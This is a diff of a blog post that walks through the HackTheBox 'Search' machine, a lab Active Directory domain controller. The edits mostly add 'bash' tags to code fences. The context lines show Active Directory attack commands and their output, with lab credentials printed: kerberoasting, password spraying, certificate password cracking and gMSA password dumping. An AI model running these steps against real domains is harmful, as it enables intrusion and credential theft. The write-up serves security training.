@@ -2,7 +2,7 @@
 title: "HackTheBox Search Write-Up"
 date: 2022-04-30
 slug: hackthebox-search-write-up
-excerpt: "The Search machine on HackTheBox has just retired! This is my write-up for Search on HackTheBox. Here I detail the penetration testing steps taken to scan,…"
+excerpt: "A full walkthrough of the Search machine (hard, Windows) on HackTheBox: Active Directory enumeration with BloodHound, credential abuse, and privilege escalation."
 source: https://blog.nicpwns.com/hackthebox-search-write-up-245e93750cfe
 tags: ["hackthebox"]
 ---
@@ -31,7 +31,7 @@ A website on a domain controller exposes multiple usernames and a password. Kerb
 
 The Nmap scan shows that there is an HTTP server on port `80/tcp` and `443/tcp` . All of the ports/services typically associated with a domain controller like port `464/tcp` and `636/tcp` are also present, suggesting this server is a domain controller.
 
-```
+```bash
 # nmap -sV -sC -p- 10.10.11.129
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-29 18:26 EDT
 Nmap scan report for 10.10.11.129
@@ -104,7 +104,7 @@ Nmap done: 1 IP address (1 host up) scanned in 334.05 seconds
 
 A gobuster directory fuzzing scan shows an interesting `/staff` directory for us to check out.
 
-```
+```bash
 # gobuster dir -u http://search.htb/ -w /usr/share/wordlists/dirpwn.txt
 ===============================================================
 Gobuster v3.1.0
@@ -174,7 +174,7 @@ Some additional potential usernames can be found from the “Our Team” section
 
 Using the first username and password we found for Hope Sharp, we can attempt to list SMB shares.
 
-```
+```bash
 # smbclient -L //search.htb/ -U Hope.Sharp
 Enter WORKGROUP\Hope.Sharp's password:
         Sharename       Type      Comment
@@ -191,7 +191,7 @@ Enter WORKGROUP\Hope.Sharp's password:
 
 Looking in the `RedirectedFolders$` share. We find even more usernames!
 
-```
+```bash
 # smbclient //search.htb/RedirectedFolders$ -U Hope.Sharp
 Enter WORKGROUP\Hope.Sharp's password:
 Try "help" to get a list of possible commands.
@@ -225,7 +225,7 @@ smb: \> ls
 
 Now that we know Hope Sharp’s password works, it’s worth giving [kerberoasting](https://attack.mitre.org/techniques/T1558/003/) a try with [Impacket](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py).
 
-```
+```bash
 # impacket-GetUserSPNs -request -dc-ip 10.10.11.129 search.htb/Hope.Sharp:IsolationIsKey?
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation
@@ -254,7 +254,7 @@ We were able to successfully crack the hash to find the plaintext password of `@
 
 Although we have this password for a service account, we have to see if this password is used for any users that can login. Using [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), we can provide a list of users that we’ve collected and the password we cracked to identify a valid combination of credentials.
 
-```
+```bash
 # crackmapexec smb search.htb -u users.txt -p '@3ONEmillionbaby' --continue-on-success
 SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True)
 SMB         search.htb      445    RESEARCH         [-] search.htb\abril.suarez:@3ONEmillionbaby STATUS_LOGON_FAILURE
@@ -272,7 +272,7 @@ SMB         search.htb      445    RESEARCH         [+] search.htb\edgar.jacobs:
 
 Edgar Jacobs is a hit! Let’s try to login to SMB with this username and the password we have.
 
-```
+```bash
 # smbclient //search.htb/RedirectedFolders$ -U edgar.jacobs
 Enter WORKGROUP\edgar.jacobs's password:
 Try "help" to get a list of possible commands.
@@ -288,7 +288,7 @@ smb: \edgar.jacobs\Desktop\> ls
 
 The login works and we can see a `Phishing_Attempt.xlsx` file on his Desktop. We'll download this and unzip it. Modern Microsoft Office files ending in 'x' are made up of XML files. We can view these XML files by unzipping the file to view all of the data.
 
-```
+```bash
 # unzip Phishing_Attempt.xlsx
 Archive:  Phishing_Attempt.xlsx
   inflating: [Content_Types].xml
@@ -317,7 +317,7 @@ Archive:  Phishing_Attempt.xlsx
 
 After digging through the XML files, one part of this `Phishing_Attempt.xlsx` file contains many usernames and passwords. Again, we have even more usernames and passwords to try out on the domain. Using [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) again we can check them all after adding them into TXT files. For the sake of space, I'm showing only the correct combination here which is the user `Sierra.Frye` and password `$$49=wide=STRAIGHT=jordan=28$$18`.
 
-```
+```bash
 crackmapexec smb search.htb -u sierra.frye  -p '$$49=wide=STRAIGHT=jordan=28$$18' --continue-on-success
 SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
 SMB         search.htb      445    RESEARCH         [+] search.htb\sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18
@@ -325,7 +325,7 @@ SMB         search.htb      445    RESEARCH         [+] search.htb\sierra.frye:$
 
 Using this username and password combination, we can successfully login to SMB and grab the `user.txt` flag!
 
-```
+```bash
 # smbclient //search.htb/RedirectedFolders$ -U sierra.frye
 Enter WORKGROUP\sierra.frye's password:
 Try "help" to get a list of possible commands.
@@ -358,7 +358,7 @@ getting file \sierra.frye\Downloads\Backups\staff.pfx of size 4326 as staff.pfx 
 
 When researching the P12 and PFX files they are related to PKI certificates for authentication. This is likely what we need to access the `/staff` directory on the web server, but we need the password to these files in order to import them into our browser for use. There is a tool called [P12Tool](https://github.com/Ridter/p12tool) that can be used to crack the password. It takes quite a while to process `rockyou.txt`.
 
-```
+```bash
 # go run cmd/main.go crack -c ../staff.pfx -f /usr/share/wordlists/rockyou.txt
 ██████╗  ██╗██████╗ ████████╗ ██████╗  ██████╗ ██╗
 ██╔══██╗███║╚════██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║
@@ -460,7 +460,7 @@ When Googling for `BIR-ADFS-GMSA$` and GMSA we can find an Active Directory atta
 
 First we need the [gMSADumper Python script](https://github.com/micahvandeusen/gMSADumper). When we run it, we can see we have access to grab the password hash as Sierra Frye!
 
-```
+```bash
 # python3 gMSADumper.py -d search.htb -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18'
 Users or groups who can read password for BIR-ADFS-GMSA$:
  > ITSec
@@ -485,7 +485,7 @@ We have successfully reset the domain administrator Tristan Davies’ password t
 
 With the domain administrator’s password changed, let’s log into SMB and grab root.txt!
 
-```
+```bash
 # smbclient //search.htb/C$ -U Tristan.Davies
 Enter WORKGROUP\Tristan.Davies's password:
 Try "help" to get a list of possible commands.
@@ -506,5 +506,7 @@ Other than the points on HackTheBox, the lessons learned are the real treasures 
 
 1.  BloodHound is an extremely powerful tool. It gives us the most likely attack vector and the shortest path to domain administrator. In this case I didn’t go into depth with documenting BloodHound, but I plan to in a future post. For now, check out [this guide](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/).
 2.  Never underestimate the exposure of just a username. With just the usernames available on the website and other easy to access locations we were able to make a lot of progress on this box.
+
+[![HackTheBox profile badge](https://www.hackthebox.com/badge/image/72382)](https://app.hackthebox.com/users/72382)
 
 Thank you for reading my write-up for the Search machine on HackTheBox. Be sure to check out my other write-ups for [HackTheBox](/notes?tag=hackthebox)!
